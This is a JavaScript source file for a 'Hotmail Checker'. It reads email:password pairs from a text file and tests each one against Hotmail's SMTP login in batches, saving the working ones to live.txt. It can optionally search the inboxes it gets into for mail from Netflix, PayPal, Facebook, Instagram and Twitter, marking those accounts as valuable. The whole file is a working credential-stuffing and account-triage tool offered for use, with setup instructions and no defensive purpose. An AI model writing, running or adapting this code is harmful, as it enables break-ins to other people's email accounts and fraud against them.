/**
 * Hotmail Checker
 * 
 * Author: Tas33n
 * Repository: https://github.com/tas33n/Hotmail-Checker.git
 * License: MIT
 * 
 * Usage:
 * - Clone the repository
 * - Install dependencies using `npm install`
 * - Prepare your email list in `mails.txt` in the format `email:password` (one per line)
 * - Configure filters in `index.js`
 * - Run the script using `node index.js`
 */

const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');
const { ImapFlow } = require('imapflow');

(async () => {
    const chalk = (await import('chalk')).default;

    // Boolean values to enable/disable various filters, turning on filter will make the process slow so only turn them on if neccassary.
    const enableNetflixFilter = false;
    const enablePayPalFilter = false;
    const enableFacebookFilter = false;
    const enableInstagramFilter = false;
    const enableTwitterFilter = false;

    // Function to get the input file name
    const getInputFileName = () => {
        if (fs.existsSync('mails.txt')) {
            return 'mails.txt';
        } else {
            const files = fs.readdirSync('.').filter(file => file.endsWith('.txt') && file !== 'live.txt' && file !== 'dead.txt');
            if (files.length > 0) {
                return files[0];
            } else {
                console.error(chalk.red('No valid input file found.'));
                process.exit(1);
            }
        }
    };

    const inputFileName = getInputFileName();

    // Read the email and passwords from the input file
    fs.readFile(inputFileName, 'utf8', (err, data) => {
        if (err) {
            console.error(chalk.red(`Error reading ${inputFileName} file`));
            return;
        }

        const currentDate = new Date();
        const logHeader = `Date: ${currentDate.toLocaleString()}\nFile: ${inputFileName}\nNumber of lines: ${data.trim().split('\n').length}\n\n`;

        fs.appendFileSync('live.txt', logHeader, 'utf8');
        fs.appendFileSync('dead.txt', logHeader, 'utf8');

        console.log(chalk.blue(logHeader));
        console.log(chalk.blue(`Filters - Netflix: ${enableNetflixFilter ? '✅ON' : '❌OFF'}, PayPal: ${enablePayPalFilter ? '✅ON' : '❌OFF'}, Facebook: ${enableFacebookFilter ? '✅ON' : '❌OFF'}, Instagram: ${enableInstagramFilter ? '✅ON' : '❌OFF'}, Twitter: ${enableTwitterFilter ? '✅ON' : '❌OFF'}`));

        const lines = data.trim().split('\n');
        const liveEmails = [];
        const deadEmails = [];

        const checkEmail = async (line) => {
            const [emailAndPass, ...rest] = line.split(' | ');
            const [email, password] = emailAndPass.split(':');

            let transporter = nodemailer.createTransport({
                service: 'hotmail',
                auth: {
                    user: email,
                    pass: password
                },
                tls: {
                    rejectUnauthorized: false
                },
                connectionTimeout: 60000
            });

            return new Promise((resolve) => {
                transporter.verify(async (error, success) => {
                    if (error) {
                        deadEmails.push(emailAndPass);
                        fs.appendFileSync('dead.txt', emailAndPass + '\n', 'utf8');
                        console.log(chalk.red(`❌ 💨 ${email}`));
                    } else {
                        liveEmails.push(emailAndPass);
                        console.log(chalk.green(`✅ 💨 ${emailAndPass}`));

                        let liveEntry = emailAndPass;

                        if (enableNetflixFilter || enablePayPalFilter || enableFacebookFilter || enableInstagramFilter || enableTwitterFilter) {

                            const client = new ImapFlow({
                                host: 'outlook.office365.com',
                                port: 993,
                                secure: true,
                                auth: {
                                    user: email,
                                    pass: password
                                },
                                logger: false
                            });

                            try {
                                await client.connect();
                                await client.mailboxOpen('INBOX');

                                let hasNetflixMail = false;
                                let hasPayPalMail = false;
                                let hasFacebookMail = false;
                                let hasInstagramMail = false;
                                let hasTwitterMail = false;

                                for await (let message of client.fetch('1:*', { envelope: true })) {
                                    if (enableNetflixFilter && message.envelope.from.some(from => from.address === 'info@account.netflix.com')) {
                                        hasNetflixMail = true;
                                    }
                                    if (enablePayPalFilter && message.envelope.from.some(from => from.address === 'service@paypal.com')) {
                                        hasPayPalMail = true;
                                    }
                                    if (enableFacebookFilter && message.envelope.from.some(from => from.address === 'notification@facebookmail.com')) {
                                        hasFacebookMail = true;
                                    }
                                    if (enableInstagramFilter && message.envelope.from.some(from => from.address === 'no-reply@mail.instagram.com')) {
                                        hasInstagramMail = true;
                                    }
                                    if (enableTwitterFilter && message.envelope.from.some(from => from.address === 'info@twitter.com')) {
                                        hasTwitterMail = true;
                                    }
                                    if (hasNetflixMail && hasPayPalMail && hasFacebookMail && hasInstagramMail && hasTwitterMail) break;
                                }

                                if (hasNetflixMail) {
                                    liveEntry += ' | Netflix ✅';
                                }
                                if (hasPayPalMail) {
                                    liveEntry += ' | PayPal ✅';
                                }
                                if (hasFacebookMail) {
                                    liveEntry += ' | Facebook ✅';
                                }
                                if (hasInstagramMail) {
                                    liveEntry += ' | Instagram ✅';
                                }
                                if (hasTwitterMail) {
                                    liveEntry += ' | Twitter ✅';
                                }

                                console.log(chalk.green(`Filtered: ${emailAndPass} | Netflix: ${hasNetflixMail ? '✅' : '❌'} | PayPal: ${hasPayPalMail ? '✅' : '❌'} | Facebook: ${hasFacebookMail ? '✅' : '❌'} | Instagram: ${hasInstagramMail ? '✅' : '❌'} | Twitter: ${hasTwitterMail ? '✅' : '❌'}`));

                                await client.logout();
                            } catch (imapError) {
                                console.log(chalk.red(`Failed to fetch emails for: ${email}`));
                            }

                        }

                        // store the data in live file
                        fs.appendFileSync('live.txt', liveEntry + '\n', 'utf8');
                    }
                    resolve();
                });
            });
        };

        const checkNextBatch = async (batch) => {
            await Promise.all(batch.map(line => checkEmail(line)));
        };

        const checkNext = async () => {
            const batchSize = 10;
            for (let i = 0; i < lines.length; i += batchSize) {
                const batch = lines.slice(i, i + batchSize);
                await checkNextBatch(batch);
            }
            console.log(chalk.blue('Authentication process completed.'));
        };

        checkNext();

    });
})();